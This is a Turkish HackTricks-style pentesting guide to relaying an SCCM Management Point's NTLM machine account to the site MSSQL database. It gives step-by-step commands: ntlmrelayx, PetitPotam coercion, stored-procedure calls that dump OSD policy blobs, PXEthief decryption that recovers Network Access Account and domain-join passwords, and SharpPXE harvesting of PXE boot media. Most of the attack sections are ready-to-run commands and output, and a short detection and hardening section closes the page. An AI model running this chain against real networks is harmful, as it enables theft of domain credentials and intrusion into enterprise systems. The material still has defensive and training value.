# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Bir **System Center Configuration Manager (SCCM) Management Point (MP)** öğesini SMB/RPC üzerinden authentication yapmaya zorlayıp bu NTLM makine hesabını **site database (MSSQL)** üzerine **relay** ederek `smsdbrole_MP` / `smsdbrole_MPUserSvc` haklarını elde edersiniz.  Bu roller, **Operating System Deployment (OSD)** policy blob'larını (Network Access Account kimlik bilgileri, Task-Sequence değişkenleri vb.) açığa çıkaran bir dizi stored procedure çağırmanıza olanak tanır.  Blob'lar hex-encoded/encrypted durumdadır ancak **PXEthief** ile decode ve decrypt edilerek plaintext secret'lar elde edilebilir.<sup>[[2]](#references)</sup>

High-level chain:
1. MP ve site DB'yi keşfedin ↦ kimlik doğrulama gerektirmeyen HTTP endpoint'i `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` komutunu başlatın.
3. PetitPotam, PrinterBug, DFSCoerce vb. kullanarak MP'yi coerce edin.
4. SOCKS proxy üzerinden `mssqlclient.py -windows-auth` ile relay edilen **<DOMAIN>\\<MP-host>$** hesabı olarak bağlanın.
5. Şunları çalıştırın:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (veya `MP_GetPolicyBodyAfterAuthorization`)
6. `0xFFFE` BOM'u kaldırın, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

`OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` vb. secret'lar PXE veya client'lara dokunmadan recovery edilebilir.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Unauthenticated MP endpoint'lerini enumerate etme
MP ISAPI extension'ı **GetAuth.dll**, kimlik doğrulama gerektirmeyen birkaç parametreyi expose eder (site yalnızca PKI kullanmıyorsa):<sup>[[1]](#references)</sup>

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Site signing cert public key'ini ve *x86* / *x64* **All Unknown Computers** cihazlarının GUID'lerini döndürür. |
| `MPLIST` | Site içindeki tüm Management-Point'leri listeler. |
| `SITESIGNCERT` | Primary-Site signing certificate'ını döndürür (LDAP olmadan site server'ı identify eder). |

Daha sonraki DB query'lerinde **clientID** olarak kullanılacak GUID'leri alın:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. MP machine account'ını MSSQL'e Relay etmek
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Coercion tetiklendiğinde şuna benzer bir çıktı görmelisiniz:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Stored procedures üzerinden OSD policy'lerini belirleme
SOCKS proxy üzerinden bağlanın (varsayılan olarak 1080 portu):<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
**CM_<SiteCode>** DB'sine geçin (3 haneli site kodunu kullanın, ör. `CM_001`).

### 3.1  Unknown-Computer GUID'lerini Bulma (isteğe bağlı)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Atanmış policy'leri listeleme
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Her satır `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion` içerir.

Şu policy'lere odaklanın:
* **NAAConfig** – Network Access Account kimlik bilgileri
* **TS_Sequence** – Task Sequence değişkenleri (OSDJoinAccount/Password)
* **CollectionSettings** – run-as hesapları içerebilir

### 3.3 Tam body'yi alma
Zaten `PolicyID` ve `PolicyVersion` değerlerine sahipseniz, aşağıdakini kullanarak clientID gereksinimini atlayabilirsiniz:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> ÖNEMLİ: SSMS'de “Maximum Characters Retrieved” değerini (>65535) artırın; aksi takdirde blob kesilecektir.

---

## 4. Blob'u decode edin ve decrypt edin
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Kurtarılan secrets örneği:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. İlgili SQL rolleri ve prosedürleri
Relay sonrasında login şu rollere eşlenir:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Bu roller onlarca EXEC yetkisi sunar; bu attack'te kullanılan temel olanlar şunlardır:

| Stored Procedure | Amaç |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Bir `clientID` için uygulanan policy'leri listeler. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Tam policy gövdesini döndürür. |
| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` path'i tarafından döndürülür. |

Tam listeyi şu komutla inceleyebilirsiniz:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE boot medyası harvesting (SharpPXE)
* **UDP/4011 üzerinden PXE yanıtı**: PXE için yapılandırılmış bir Distribution Point'a PXE boot isteği gönderin. proxyDHCP yanıtı, `SMSBoot\\x64\\pxe\\variables.dat` (şifrelenmiş yapılandırma) ve `SMSBoot\\x64\\pxe\\boot.bcd` gibi boot yollarını ve isteğe bağlı bir şifrelenmiş key blob'unu ortaya çıkarır.<sup>[[4]](#references)</sup>
* **Boot artifact'larını TFTP üzerinden alın**: Döndürülen yolları kullanarak `variables.dat` dosyasını TFTP üzerinden indirin (kimlik doğrulama gerektirmez). Dosya küçüktür (birkaç KB) ve şifrelenmiş media variables içerir.
* **Decrypt veya crack işlemi**:
- Yanıt decryption key içeriyorsa `variables.dat` dosyasını doğrudan decrypt etmek için **SharpPXE**'ye verin.
- Key sağlanmıyorsa (PXE media custom password ile korunuyorsa), SharpPXE offline cracking için **Hashcat-compatible** bir `$sccm$aes128$...` hash üretir. Password recovery işleminden sonra dosyanın şifresini çözün.
* **Decrypt edilmiş XML'i parse edin**: Plaintext variables, SCCM deployment metadata'sı (**Management Point URL**, **Site Code**, media GUID'leri ve diğer identifier'lar) içerir. SharpPXE bunları parse eder ve devam eden abuse için GUID/PFX/site parametreleri önceden doldurulmuş, çalıştırmaya hazır bir **SharpSCCM** command yazdırır.
* **Gereksinimler**: yalnızca PXE listener'a (UDP/4011) ve TFTP'ye network erişimi gerekir; local admin privileges gerekli değildir.

---

## 7. Detection ve Hardening
1. **MP login'lerini izleyin** – kendi host'u olmayan bir IP'den login yapan herhangi bir MP computer account ≈ relay.<sup>[[1]](#references)</sup>
2. Site database üzerinde **Extended Protection for Authentication (EPA)** özelliğini etkinleştirin (`PREVENT-14`).
3. Kullanılmayan NTLM'i devre dışı bırakın, SMB signing'i zorunlu kılın, RPC'yi kısıtlayın (
`PetitPotam`/`PrinterBug`'a karşı kullanılan mitigation'ların aynısı).
4. MP ↔ DB iletişimini IPSec / mutual-TLS ile harden edin.
5. **PXE exposure'ını kısıtlayın** – UDP/4011 ve TFTP'yi trusted VLAN'larla sınırlandırın, PXE password'leri zorunlu kılın ve `SMSBoot\\*\\pxe\\variables.dat` TFTP download'ları için alert oluşturun.<sup>[[4]](#references)</sup>

---

## Ayrıca bkz.
* NTLM relay temelleri:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse ve post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## References
- [1] [Manager'ınızla Konuşmak İstiyorum: Management Point Relay'leriyle Secret'ları Çalmak](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
